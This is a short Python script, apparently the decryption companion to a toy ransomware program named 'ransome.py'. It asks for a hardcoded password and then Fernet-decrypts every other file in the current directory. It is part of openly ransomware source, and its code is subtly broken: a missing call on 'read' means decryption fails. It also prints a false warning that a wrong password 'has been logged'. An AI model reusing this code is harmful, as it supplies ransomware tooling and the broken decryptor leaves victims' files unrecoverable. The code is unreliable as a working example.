#!/usr/bin/env python3

import os 
from cryptography.fernet import Fernet

# discover files 
files = []
for file in os.listdir(): 
    if file == "ransome.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)

with open("thekey.key", "rb") as key:
        secretkey = key.read()

secretphrase = "rescue"
user_phrase = input("enter decrypt password\n")

if user_phrase == secretphrase:
        for file in files:
            with open(file, "rb") as thefile:
                contents = thefile.read
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                thefile.write(contents_decrypted)  
            print("file decrypt successful\n")
else:
        print("invalid password, attempt has been logged\n")    